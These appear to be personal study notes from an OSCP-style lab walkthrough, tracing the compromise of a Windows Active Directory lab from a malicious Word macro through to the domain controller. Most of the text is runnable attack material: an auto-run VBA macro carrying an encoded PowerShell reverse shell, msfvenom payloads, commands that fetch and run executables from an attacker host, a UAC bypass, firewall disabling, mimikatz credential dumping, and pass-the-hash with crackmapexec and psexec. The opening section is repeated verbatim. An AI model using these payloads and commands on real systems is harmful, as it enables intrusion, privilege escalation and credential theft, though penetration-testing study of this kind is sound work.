```powershell
https://github.com/k4sth4/UAC-bypass
```

```
18:12

# identify the domain controller 1st
rustscan examples:
- rustscan -a 10.11.1.20-24
- rustscan -a hosts.txt
- image 2
IP's from rustscan:
10.11.1.20:53
10.11.1.21:80
	- this is the only port 80 webserver so going to check this 1st.
10.11.1.20:88
	- this is the DC due to having 88 on it
10.11.1.20:135
10.11.1.21:139
10.11.1.24:139
```

```
18:21
http://10.11.1.21:80
- website provides a ftp server on port 21
- credentials editor:MyEditWork
# offsec provides a windows machine on the exam, or you could use your own.

```

![[3 http 10.11.1.21 80.png]]

```
19:26
- in word use a macro template by opening a word document on native windows os, opening a new document and in the search function type in macro
- reference image 4

```

```
19:35
- hit create following settings in image 4 and add code below.
- reference image 5

Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
// Formatted Payload
    CreateObject("Wscript.Shell").Run Str
End Sub

- the next step is to make our payload and insert it under // Formatted Payload
- when dealing with macros you dont want to make it too complicated to ensure the program doesnt crash and troubleshooting is easier.
```

```
19:41
- go to revshells.com and generate a payload.
- stopped @2336 in video vba formatting.
```

```
# payload to put into word macro under formatted payload.
18:21
06Feb2023

Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"



Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
	Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
	Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
	Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
	Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
	Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
	Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
	Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
	Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
	Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
	Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
	Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
	Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
	Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
	Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
	Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
	Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
	Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
	Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
	Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
	Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
	Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
	Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
	Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
	Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub
```


```
18:27
- ensure to save document with a macro enabled format
- image 8
- transfer the file over to linux and attempt to ftp transfer over to the ftp server provided in image 3.
- * NOTE THIS FILE GETS DELETED EVERY 5 MINUTES*
```

![[9 ftp put editor.doc.png]]

```
18:31
# setup a nc listener
nc -lvnp 8443
```

```
18:33
- caught reverse shell
- image 10

```
![[10 caught payload.png]]

```
# going to upgrade shell to an msfvenom shell so we can work out of this shell. recommendation to not use http or https to pivot through the network, recommendation msfvenom command below. TCP IS RECOMMENDED.

18:34
mfsvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o /kali/home/Documents/transfer/shell.exe
```

![[11 msfvenom shell upgrade.png]]


```
18:46
- stopped watching at 42:18, people on reddit say that he made this way more confusing than it needs to be. just going to keep pwning boxes for now.
```


```
18:12

# identify the domain controller 1st
rustscan examples:
- rustscan -a 10.11.1.20-24
- rustscan -a hosts.txt
- image 2
IP's from rustscan:
10.11.1.20:53
10.11.1.21:80
	- this is the only port 80 webserver so going to check this 1st.
10.11.1.20:88
	- this is the DC due to having 88 on it
10.11.1.20:135
10.11.1.21:139
10.11.1.24:139
```

```
18:21
http://10.11.1.21:80
- website provides a ftp server on port 21
- credentials editor:MyEditWork
# offsec provides a windows machine on the exam, or you could use your own.

```

![[3 http 10.11.1.21 80.png]]

```
19:26
- in word use a macro template by opening a word document on native windows os, opening a new document and in the search function type in macro
- reference image 4

```

```
19:35
- hit create following settings in image 4 and add code below.
- reference image 5

Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
// Formatted Payload
    CreateObject("Wscript.Shell").Run Str
End Sub

- the next step is to make our payload and insert it under // Formatted Payload
- when dealing with macros you dont want to make it too complicated to ensure the program doesnt crash and troubleshooting is easier.
```

```
19:41
- go to revshells.com and generate a payload.
- stopped @2336 in video vba formatting.
```

```
# payload to put into word macro under formatted payload.
18:21
06Feb2023

Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"



Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
	Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
	Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
	Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
	Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
	Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
	Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
	Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
	Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
	Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
	Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
	Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
	Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
	Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
	Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
	Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
	Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
	Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
	Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
	Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
	Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
	Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
	Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
	Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
	Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub
```


```
18:27
- ensure to save document with a macro enabled format
- image 8
- transfer the file over to linux and attempt to ftp transfer over to the ftp server provided in image 3.
- * NOTE THIS FILE GETS DELETED EVERY 5 MINUTES*
```

![[9 ftp put editor.doc.png]]

```
18:31
# setup a nc listener
nc -lvnp 8443
```

```
18:33
- caught reverse shell
- image 10

```
![[10 caught payload.png]]

```bash 
# going to upgrade shell to an msfvenom shell so we can work out of this shell. recommendation to not use http or https to pivot through the network, recommendation msfvenom command below. TCP IS RECOMMENDED.

18:34
mfsvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o /kali/home/Documents/transfer/shell.exe
```

![[11 msfvenom shell upgrade.png]]


```
18:46
- stopped watching at 42:18, people on reddit say that he made this way more confusing than it needs to be. just going to keep pwning boxes for now.
```

```
17:25
21Feb2023
Picking back up 
```

```
17:31
# setting up reverse shell listener
nc -lvnp 8443
```

![[12 nc listener setup.png]]


```powershell
- creates pwn.ps1 
# powershell that invokes the shell.exe msfvenom payload ( essentially a wget) as well as outputs it into C:\Windows\Tasks\shell.exe
# refer to image 13

Invoke-WebRequest -Uri http://<IP> -OutFile C:\Windows\tasks\shell.exe;Start-Process -NoNewWindows - FilePath C:\Windows\Tasks\shell.exe

```
![[13 pwn.ps1 creation.png]]


```
# begins hosting web server
#refer to image 14

17:45

```
![[14 web server hosting.png]]

```powershell
17:46

# command that is essentially another way to wget through powershell
# on windows box in powershell
iwr -uri 192.168.119.139 -OutFile shell.exe

```

![[15 successful reverse shell xfer.png]]

```powershell
# how to start the file that was transferred already tranferred to the victim in powershell
17:51

Start-Process -NoNewWindows - FilePath C:\Windows\Tasks\shell.exe
```

```
# due to the shell not working on port 443, the instructor decides to run a netstat - ano to show open ports that could be used for a reverse shell.
# refer to image 16 for netstat results
# he decides to go with 139 that is open and has a connection that is established
```

![[16 netstat -ano.png]]

```powershell
# make new msfvenom payload for port 139

msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=139 EXITFUNC=thread -f exe -o /kali/home/Documents/transfer/shell_139.exe

# starting a listener on port 139
nc -lnvp 139


# writing file over to victim
# this method will be normal in AD environment for the test, will have to do digging to find an open port

iwr -uri 192.168.119.139 -OutFile shell_139.exe
```

```
# got shell back
- image 17

```

![[17 on box with msfvenom rev shell.png]]


```
# there are two steps once we are on the box in AD!
	1st - Privilege escalate and get local admin on the box.
	2nd - Get Domain Administrator

# on windows you want to look at services to see if theres an internal service like smb or sql that could be exploited.
# look for cms
# other than that can expect unquoted service path and other stuff in labs.

```

![[18 whoami all p1.png]]

![[19 whoami all p2.png]]

```
# instructor notes
# typically it is a good idea to run powerup or powerview 1st to get the juicy parts to priv esc and after that can upload winpeas considering it spits out alot more information.
# match the information from powerview/powerup to winpeas  to double check and get confidence boost.
```

```powershell
# command to invoke/run PowerUp.ps1
# refer to image 20
iex(new-object net.webclient).downloadstring('http:192.168.119.139/PowerUp.ps1');Invoke-AllChecks
```

![[20 PowerUp.ps1 Invoke&RUN.png]]

```powershell
# command that is able to pull all 3 files in one swoop (PowerUp.ps1, PowerView.ps1, mimikatz.exe)
# downloads several files in one go
# refer to image 21

$baseURL= "http://192.168.119.139/" # change ip
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "mimikatz.exe")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest - Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}
```

![[21 powershell multi file download.png]]

```
# instructor random note
# run windows-binaries  to display windows-binaries
- image 22
```

![[22 windows binaries examples.png]]

```powershell
# once the several file download powershell script is in a file ( in this case pwn.ps1 now ) back on victim box get into powershell and invoke pwn.ps1 to get all files needed over to victim.
# refer to image 23

C:\windows\tasks>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\windows\tasks>iex (iwr -uri 192.168.119.139/pwn.ps1 -usebasicparsing)

# once command above was ran it gave the instructor an error but still xferred over all the files and worked.
# refer to image 24
# originally failed because UP was capitalized
```

![[23 xferring new pwn.ps1 over.png]]

![[24 pwn.ps1 server file fail & success.png]]

```powershell
# due to PowerUp.ps1 not making it due to instructor error, reuploading PowerUp.ps1 with below command

iwr -uri 192.168.119.139/PowerUp.ps1 -Outfile powerup.ps1
```

```powershell
# instructor runs an ls to make sure we got all the needed tools on box.
# import-module .\powerup.ps1 imports all needed modules
# Invoke-AllChecks checks everything for us - QUICK WINS.
# refer to image 25

# this is essentially running power up now and finding a method to priv esc.
PS C:\windows\tasks>import-module .\powerup.ps1
import-module .\powerup.ps1
PS C:\windows\tasks> Invoke-AllChecks
Invoke-AllChecks
```

![[25 ls - import - invoke all checks.png]]

```
# Invoke-AllChecks from powerup.ps1 revealed alices credentials

-svcorp\alice:ThisIsTheUsersPassword01

# powerup.ps1 also shows a Hijack DLL abuse function as well as a bypassUAC attack
# refer to image 27
```

![[26 alice creds.png]]

![[27 bypassUAC dll hijack.png]]



```
# in order to exploit UAC bypass we can use a few different things
- powersploit
- powershell empire
- CSEnox EventViewer-UACBypass
- https://github.com/CsEnox/EventViewer-UACBypass
```

```
# stopping for the day @ 5743, need to go get food.
# lied starting up again @ 21:50
```

```
# attempting to enable rdp on box because the command below

Invoke-EventViewer cmd.exe

# might pop up an additional cmd.exe which would require a gui
```

```powershell
# Command to Enable RDP and Add user to rdp group.
# image 28 

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 

netsh advfirewall set allprofiles state off

net localgroup "remote desktop users" <User.Name> /add

```
![[28 enable rdp and add users.png]]

```
# instructor got access denied when enabling rdp, need administrator access.
```

```powershell
# used to transfer file fromkali machine to victim, this is the tool that is going to be used to exploit the UACBypass privilege escalation
iwr -uri 192.168.119.139/Invoke-EventViewer.ps1 -Outfile evn_bypass.ps1
```

```bash
# creating an additional msfvenom using a known open port to have event viewer open, and execute the reverse shell which gives us local administrator

mfsvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o /kali/home/Documents/transfer/shell_8444.exe

# could additionally add a user that doesn't have the rdp restriction
```

```bash
#creating additional nc listener

nc -lvnp 8444
```

```powershell
#putting shell onto victim machine
iwr -uri 192.168.119.139/shell_8444.exe -Outfile shell_8444.exe
```

```powershell
# ls to ensure the tool event viewer ) for uac bypass) and the shell are on the victim box and run commands below.

#using powerview to import module into powershell
import-module .\evn_bypass.ps1

#executing the UAC Bypass command and telling it to execute our reverse shell.
Invoke-EventViewer C:\Windows\Tasks\shell_8444.exe
```

```
#refer to image 29 for results, we are now on with local administrator.

Initial access through macro
Priv esc through UAC Bypass with event viewer.

# ended at 22:11, burnt out.
https://www.youtube.com/watch?v=2NLi4wzAvTw&t=2777s

# as long as we are system like below system we are able to run powerview/winpeas/mimikatz
```
![[29 whoami -priv.png]]


```shell
# running files transferred to victim box considering we now have system privileges.

C:\Windows\tasks>.\mimikatz.exe

# 2 tasks with mimikatz.exe
	- dumping local sam to give us passwords and hazshes for loval users and administrators on host
	- LSASS dump to return credentials in regards of the domain
```

```shell
MIMIKATZ Commands

# elevate token to make sure that commands are being ran as system.
token::elevate

#  check our privileges to ensure we are running as system - image 31
privilege::debug

# displays any users passwords on the box if they are logged in
sekurlsa::logonpasswords

## dumps all hashes from mimikatz
lsadump::sam

lsadump::secrets

lsadump::cache
- image 32, displays new user tris - possibly didnt logout




```
![[30 mimikatz cmds.png]]

![[31 mimikatz priv debug.png]]


![[32 mimikatz lsadump cache.png]]



```powershell
# instructor is now putting winPEASany.exe onto the victim.

# winPEAS transfer success
iwr -Uri 192.168.119.139/winPEASany.exe -OutFile winPEASany.exe

# running winpeas and lookign at previous results from mimikatz while winpeas is running
C:\windows\tasks>.\winPEASany.exe

# in image 33 any SVCLIENT08$ with a dollar sign represents a machine account name for every host
```

![[33 machine name mimi.log.png]]

```
# interesting that alice has an account on the domain controller, maybe try to login with that with rdp considering we now have a password.
```
![[34 mimikatz alice.png]]

```powershell
# follow image 28 to enable rdp as well as add a user to the rdp group.

# adding alice to RDP group, this should allow us to rdp in from our host as alice considering we have her password ThisIsTheUsersPassword01
PS C:\windows\tasks> net localgroup "remote desktop users" alice /add
```

```
# reviewing winpeas results
- could use image 35 cifs service with alice to get onto the host sv-file01
```

![[35 winpeas cifs alice.png]]

```
# going to use crackmap exec using mimikatz sekurlsa::logonpasswords - administrator NTLM hash to crackmap exec from out kali machine
- image 36
```

![[36 crackmap exec mimikatz ntlm hash.png]]


```shell
# running crackmap exec 

crackmapexec smb -u administrator -H ee0c207898a5bccc01f38115019ca2fb

# using machine client ntlm as well, specifying domain and IP
# image 37 ntlm
crackmapexec smb -u administrator -H 04fd6bdf12651cbd3038ce7690ce7bca -d corp.com 10.11.1.20

# cme to check if any user on the corp.com domain has the ntlm has below.
# image 38 displays that someone is using the ntlm hash on the domain
crackmapexec smb -u '' -H 04fd6bdf12651cbd3038ce7690ce7bca -d corp.com 10.11.1.20



```

![[37 machine account ntlm.png]]

![[38 valid ntlm hash on domain.png]]


```shell

# instructor going to look back at winpeas results.
# image 39 of winpeas displays all logged in users ever, whioh means we should be able to get the hashes for all these users

- tris
- alice
- Adminsitrator
- offsec
- defaultuser0

```

![[39 winpeas logged on users.png]]

```shell
# trying crack map exec with the user tris as well as the 04 ntlm hash, results in image 40
crackmapexec smb -u 'tris' -H 04fd6bdf12651cbd3038ce7690ce7bca -d corp.com 10.11.1.20-24 --continue-on-success

# even though the credentials didnt work, we can now confirm that tris is on all machines of the domain.
```

![[40 tris crackmapexec.png]]

```
# going to try to target the SV-File01 computer to see if we can get access to that service as a foothold
# checks mimikatz results in regard to the SV-File01 and didnt find anything.
```

```shell
# command runs an smb check on the ntlm hash for administrator as well as performs a secretsdump on other users across clients on the domain.
#NOTE: 
crackmapexec smb 10.11.1.20-24 -u administrator -H 'ee0c207898a5bccc01f38115019ca2fb' --local-auth --lsa
```


![[41 cme local auth.png]]

```shell
# similar command to above
crackmapexec smb -H ee0c207898a5bccc01f38115019ca2fb -u administrator --local-auth 10.11.1.20-24
```

![[42 crackmapexec example.png]]

```shell
# go back through notes to see where this hash came from, though I believe that it did come from mimikatz.exe
impacket-psexec 'SVCLIENT73/administrator' @10.11.1.24 -hashes ':ee0c207898a5bccc01f38115019ca2fb'
```

#onassystem

![[43 psexec 10.11.1.24 system.png]]


```shell
#additional way to transfer file onto victim machine - xferrred mimikatz.exe.
certutil -split -urlcache -f http://192.168.119.139/mimikatz.exe C:\windows\tasks\mimi.exe

# NOTE! essentially once you psexec onto another box with known creds you are able to just dump the creds with mimikatz - psexec onto the next machine - be system - upload mimikatz.. psexec on - etc, rinse repeat.
# additional note, once on with PSEXEC you dont really wanna continue on with that shell, you want to get another msfvenom shell and work out of that one.

# note 8443 did not work, so had to create an additional shell with port 8444
certutil -split -urlcache -f http://192.168.119.139/shell_8444.exe C:\windows\tasks\mimi.exe

```

![[44 new reverse shell.png]]

```shell
#setting up listener to catch the reverse shell

nc -lvnp 8444
```

![[45 caught reverse shell.png]]


```shell
#running mimikatz
.\mimi.exe

#elevating to system
mimikatz # token::elevate

sekurlsa::msv

#creating one line of mimikatz so we can just find everything in one swoop
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache

#mimikatz spit out new user pete who has an account on the Domain controller. got NTLM hash/IP/and  domain which should allow us yo psexec/pth
# or not
```

```powershell

# throwing powerup on to the box
iwr -uri 192.168.119.139/PowerUp.ps1 -OutFile powerup.ps1

#host http server
python3 http.server
```

```powershell

#attempted to evil-winrm with pete's ntlm hash and username on all the IP addresses in the domain but didnt work.

evil-winrm -i 10.11.1.22 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207
evil-winrm -i 10.11.1.20 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207

# was able to winrm back onto the file server (sv-file01) that we already had access to
# image 46
evil-winrm -i 10.11.1.21 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207
```

![[46 back on sv-file01.png]]

```powershell

#looking for some kind of service that pete might have access to would allow us onto the domain.

# first uploading reverse shell in evil-winrm shell to connect back to to improve functionality.

*Evil-WinRM* PS C:\windows\tasks> upload shell_139.exe

# setup listener

nc -lvnp 139

```

![[47 sv-file01 with better shell.png]]


```powershell
# getting into powershell with new reverse shell
powershell -ep bypass

#running mimikatz.exe
# going slow gso going to go back to evil-winrm to upload mimikatz.exe
iwr -uri 192.168.119.139/mimikatz.exe - OutFile mimi.exe

#evil winrm mimikatz upload
*Evil-WinRM* PS C:\windows\tasks> upload mimikatz.exe
```

```shell
# back on file server running mimikatz as pete.

.\mimikatz.exe
token::elevate
# local passwords to see if anyone else is on the box.
sekurlsa::logonpasswords
# identified tris again, 

sekurlsa::msv

```

![[48 logonpasswords tris.png]]

```shell

# attemptin crackmapexec to the domain with tris and new ntlm hash found

crackmapexec smb 10.11.1.20 -u tris -H '08df3c73ded940e1f2bcf5eea4b8dbf6' -d svcorp.com --continue-on-success


```

![[49 pwned tris SV-DC01.png]]

```shell
#psexec'ing onto domain controller with tris credentials
# the domain name always comes first before user like svcorp.com/tris
impacket-psexec -hashes ':08df3c73ded940e1f2bcf5eea4b8dbf6' svcorp.com/tris@10.11.1.20
```

![[50 PWNED DC.png]]